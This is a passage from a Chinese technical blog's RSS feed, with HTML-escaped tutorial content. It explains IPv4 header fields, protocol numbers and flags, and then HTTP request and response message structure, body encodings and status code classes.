&lt;td>标识符(16位)&lt;/td>
&lt;td>标志(3位)+片偏移(13位)&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>8-11&lt;/td>
&lt;td>生存时间(8位)&lt;/td>
&lt;td>协议(8位)&lt;/td>
&lt;td>首部校验和(16位)&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>12-15&lt;/td>
&lt;td>源IP地址(32位)&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>16-19&lt;/td>
&lt;td>目的IP地址(32位)&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>20+&lt;/td>
&lt;td>选项+填充(如果有，0-40字节)&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="按位分布详解">按位分布详解
&lt;/h3>&lt;p>第0行（0-3字节）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> 0 1 2 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|版本| 首部长度 | 服务类型 | 总长度 |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>第1行（4-7字节）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> 0 1 2 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 标识符 |标志| 片偏移 |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>第2行（8-11字节）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> 0 1 2 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 生存时间 | 协议 | 首部校验和 |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>第3-4行（12-19字节）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 源IP地址 |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 目的IP地址 |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>第5行及以后（20+字节，如果有）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 选项 + 填充（如果有） |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="字段说明">字段说明
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>第0-3字节字段&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>版本&lt;/strong>：4位，IPv4为4，IPv6为6&lt;/li>
&lt;li>&lt;strong>首部长度&lt;/strong>：4位，以4字节为单位（最小值5，最大值15）&lt;/li>
&lt;li>&lt;strong>服务类型&lt;/strong>：8位，指定服务质量&lt;/li>
&lt;li>&lt;strong>总长度&lt;/strong>：16位，首部+数据的总字节数（最大值65535）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>第4-7字节字段&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>标识符&lt;/strong>：16位，用于分片重组&lt;/li>
&lt;li>&lt;strong>标志&lt;/strong>：3位（保留位、DF位、MF位）&lt;/li>
&lt;li>&lt;strong>片偏移&lt;/strong>：13位，以8字节为单位&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>第8-11字节字段&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>生存时间&lt;/strong>：8位，经过路由器减1，为0时丢弃&lt;/li>
&lt;li>&lt;strong>协议&lt;/strong>：8位，上层协议类型&lt;/li>
&lt;li>&lt;strong>首部校验和&lt;/strong>：16位，只检验首部&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>第12-19字节字段&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>源IP地址&lt;/strong>：32位&lt;/li>
&lt;li>&lt;strong>目的IP地址&lt;/strong>：32位&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>第20+字节字段（如果有）&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>选项&lt;/strong>：可变长度，0-40字节&lt;/li>
&lt;li>&lt;strong>填充&lt;/strong>：确保首部是4字节的整数倍&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="协议字段值对照表">协议字段值对照表
&lt;/h2>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>协议值&lt;/th>
&lt;th>协议名称&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>ICMP&lt;/td>
&lt;td>Internet控制报文协议，用于发送错误消息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>IGMP&lt;/td>
&lt;td>Internet组管理协议，用于多播&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6&lt;/td>
&lt;td>TCP&lt;/td>
&lt;td>传输控制协议，面向连接的可靠传输&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>17&lt;/td>
&lt;td>UDP&lt;/td>
&lt;td>用户数据报协议，无连接的不可靠传输&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>47&lt;/td>
&lt;td>GRE&lt;/td>
&lt;td>通用路由封装，用于VPN&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>50&lt;/td>
&lt;td>ESP&lt;/td>
&lt;td>IPSec加密安全载荷，提供加密和认证&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>51&lt;/td>
&lt;td>AH&lt;/td>
&lt;td>IPSec认证头，提供数据完整性&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>89&lt;/td>
&lt;td>OSPF&lt;/td>
&lt;td>开放最短路径优先，内部网关路由协议&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="服务类型tos字段详解">服务类型(ToS)字段详解
&lt;/h2>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>位置&lt;/th>
&lt;th>名称&lt;/th>
&lt;th>值&lt;/th>
&lt;th>含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0-2&lt;/td>
&lt;td>优先级&lt;/td>
&lt;td>000&lt;/td>
&lt;td>常规&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>001&lt;/td>
&lt;td>优先&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>010&lt;/td>
&lt;td>立即&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>011&lt;/td>
&lt;td>闪电&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>100&lt;/td>
&lt;td>覆盖&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>101&lt;/td>
&lt;td>关键&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>110&lt;/td>
&lt;td>网间控制&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>111&lt;/td>
&lt;td>网络控制&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>延迟&lt;/td>
&lt;td>0&lt;/td>
&lt;td>正常延迟&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>1&lt;/td>
&lt;td>低延迟&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>吞吐量&lt;/td>
&lt;td>0&lt;/td>
&lt;td>正常吞吐量&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>1&lt;/td>
&lt;td>高吞吐量&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5&lt;/td>
&lt;td>可靠性&lt;/td>
&lt;td>0&lt;/td>
&lt;td>正常可靠性&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>1&lt;/td>
&lt;td>高可靠性&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6&lt;/td>
&lt;td>成本&lt;/td>
&lt;td>0&lt;/td>
&lt;td>正常成本&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>1&lt;/td>
&lt;td>最小成本&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>7&lt;/td>
&lt;td>保留&lt;/td>
&lt;td>0&lt;/td>
&lt;td>保留未用&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="标志字段说明表">标志字段说明表
&lt;/h2>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>位&lt;/th>
&lt;th>名称&lt;/th>
&lt;th>值&lt;/th>
&lt;th>含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>保留&lt;/td>
&lt;td>0&lt;/td>
&lt;td>必须为0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>DF&lt;/td>
&lt;td>0&lt;/td>
&lt;td>允许分片&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>1&lt;/td>
&lt;td>不允许分片&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>MF&lt;/td>
&lt;td>0&lt;/td>
&lt;td>最后的分片&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>1&lt;/td>
&lt;td>还有分片&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="总结">总结
&lt;/h2>&lt;p>IP数据报文的字段设计非常精巧，每个字段都有其特定的用途，共同保证了网络通信的可靠性和效率。理解这些字段的含义对于：&lt;/p>
&lt;ul>
&lt;li>网络故障排查&lt;/li>
&lt;li>性能优化&lt;/li>
&lt;li>安全防护&lt;/li>
&lt;/ul>
&lt;p>都有重要意义。&lt;/p></description></item><item><title>HTTP请求报文字段和响应字段报文</title><link>https://souljian.cn/p/746087716/</link><pubDate>Thu, 01 May 2025 16:21:56 +0800</pubDate><guid>https://souljian.cn/p/746087716/</guid><description>&lt;h2 id="http请求报文结构">HTTP请求报文结构
&lt;/h2>&lt;p>HTTP请求报文由三部分组成：&lt;/p>
&lt;ol>
&lt;li>请求行（Request Line）&lt;/li>
&lt;li>请求头（Request Header）&lt;/li>
&lt;li>请求体（Request Body）&lt;/li>
&lt;/ol>
&lt;h3 id="1-请求行">1. 请求行
&lt;/h3>&lt;p>请求行包含三个重要信息：&lt;/p>
&lt;ul>
&lt;li>请求方法（GET、POST、PUT等）&lt;/li>
&lt;li>请求URL&lt;/li>
&lt;li>HTTP协议版本&lt;/li>
&lt;/ul>
&lt;p>示例：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/index.html&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个请求行表示：&lt;/p>
&lt;ul>
&lt;li>使用GET方法获取资源&lt;/li>
&lt;li>请求的资源路径是/index.html&lt;/li>
&lt;li>使用的是HTTP/1.1版本协议&lt;/li>
&lt;/ul>
&lt;h3 id="2-常见请求头字段">2. 常见请求头字段
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>字段名&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Host&lt;/td>
&lt;td>请求的服务器域名&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>User-Agent&lt;/td>
&lt;td>客户端信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Accept&lt;/td>
&lt;td>客户端可接受的响应内容类型&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Accept-Language&lt;/td>
&lt;td>客户端可接受的语言&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Accept-Encoding&lt;/td>
&lt;td>客户端可接受的内容编码&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Connection&lt;/td>
&lt;td>连接管理，如keep-alive&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Cookie&lt;/td>
&lt;td>客户端存储的Cookie信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Type&lt;/td>
&lt;td>请求体的MIME类型&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Length&lt;/td>
&lt;td>请求体的长度&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="3-请求体">3. 请求体
&lt;/h3>&lt;p>请求体包含发送给服务器的数据，常见于POST请求。数据格式可以是：&lt;/p>
&lt;h4 id="1-applicationx-www-form-urlencoded">1) application/x-www-form-urlencoded
&lt;/h4>&lt;ul>
&lt;li>最常见的POST提交数据方式&lt;/li>
&lt;li>格式：&lt;code>key1=value1&amp;amp;key2=value2&lt;/code>&lt;/li>
&lt;li>特点：
&lt;ul>
&lt;li>数据会被URL编码（空格转换为+，特殊字符转换为ASCII HEX值）&lt;/li>
&lt;li>适合简单的文本数据提交&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例：&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">username=张三&amp;amp;password=123456&amp;amp;age=25
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个示例表示：&lt;/p>
&lt;ul>
&lt;li>提交了三个字段：username、password和age&lt;/li>
&lt;li>数据以键值对形式传输&lt;/li>
&lt;li>使用&amp;amp;符号分隔不同的字段&lt;/li>
&lt;li>所有数据都经过URL编码&lt;/li>
&lt;/ul>
&lt;h4 id="2-applicationjson">2) application/json
&lt;/h4>&lt;ul>
&lt;li>现代API中最流行的数据格式&lt;/li>
&lt;li>数据以JSON格式传输&lt;/li>
&lt;li>特点：
&lt;ul>
&lt;li>支持复杂的数据结构（嵌套对象、数组等）&lt;/li>
&lt;li>可读性好&lt;/li>
&lt;li>数据类型丰富&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例：&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;username&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;张三&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;age&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">25&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;hobbies&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;读书&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;运动&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;address&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;city&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;北京&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;street&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;朝阳区&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个示例展示了JSON格式的优势：&lt;/p>
&lt;ul>
&lt;li>可以表示嵌套的数据结构（address是一个对象）&lt;/li>
&lt;li>支持数组类型（hobbies是一个数组）&lt;/li>
&lt;li>支持多种数据类型（字符串、数字）&lt;/li>
&lt;li>层次结构清晰，易于阅读和解析&lt;/li>
&lt;/ul>
&lt;h4 id="3-multipartform-data">3) multipart/form-data
&lt;/h4>&lt;ul>
&lt;li>主要用于文件上传场景&lt;/li>
&lt;li>特点：
&lt;ul>
&lt;li>可以同时上传文件和文本数据&lt;/li>
&lt;li>每个表单项都有独立的边界字符串分隔&lt;/li>
&lt;li>支持二进制文件传输&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例：&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">------WebKitFormBoundary7MA4YWxkTrZu0gW
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Content-Disposition: form-data; name=&amp;#34;username&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">张三
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">------WebKitFormBoundary7MA4YWxkTrZu0gW
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Content-Disposition: form-data; name=&amp;#34;photo&amp;#34;; filename=&amp;#34;profile.jpg&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Content-Type: image/jpeg
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">[二进制文件内容]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">------WebKitFormBoundary7MA4YWxkTrZu0gW--
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个示例说明：&lt;/p>
&lt;ul>
&lt;li>使用特定的边界字符串分隔不同的表单项&lt;/li>
&lt;li>可以同时上传文本（username）和文件（photo）&lt;/li>
&lt;li>每个部分都有自己的Content-Disposition说明&lt;/li>
&lt;li>文件上传部分包含文件名和文件类型信息&lt;/li>
&lt;/ul>
&lt;h2 id="http响应报文结构">HTTP响应报文结构
&lt;/h2>&lt;p>HTTP响应报文也由三部分组成：&lt;/p>
&lt;ol>
&lt;li>状态行（Status Line）&lt;/li>
&lt;li>响应头（Response Header）&lt;/li>
&lt;li>响应体（Response Body）&lt;/li>
&lt;/ol>
&lt;h3 id="1-状态行">1. 状态行
&lt;/h3>&lt;p>状态行包含：&lt;/p>
&lt;ul>
&lt;li>HTTP协议版本&lt;/li>
&lt;li>状态码&lt;/li>
&lt;li>状态描述&lt;/li>
&lt;/ul>
&lt;p>示例：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span> &lt;span class="m">200&lt;/span> &lt;span class="ne">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个状态行表示：&lt;/p>
&lt;ul>
&lt;li>使用HTTP/1.1版本协议&lt;/li>
&lt;li>状态码是200，表示请求成功&lt;/li>
&lt;li>OK是对状态码的文字描述&lt;/li>
&lt;/ul>
&lt;h3 id="2-常见状态码">2. 常见状态码
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>状态码&lt;/th>
&lt;th>类别&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1xx&lt;/td>
&lt;td>信息性状态码&lt;/td>
&lt;td>请求已接收，继续处理&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2xx&lt;/td>
&lt;td>成功状态码&lt;/td>
&lt;td>请求已成功接收、理解、接受&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3xx&lt;/td>
&lt;td>重定向状态码&lt;/td>
&lt;td>需要进一步操作以完成请求&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4xx&lt;/td>
&lt;td>客户端错误状态码&lt;/td>
&lt;td>请求包含语法错误或无法完成请求&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5xx&lt;/td>
&lt;td>服务器错误状态码&lt;/td>
&lt;td>服务器在处理请求时发生错误&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>常见状态码：&lt;/p>
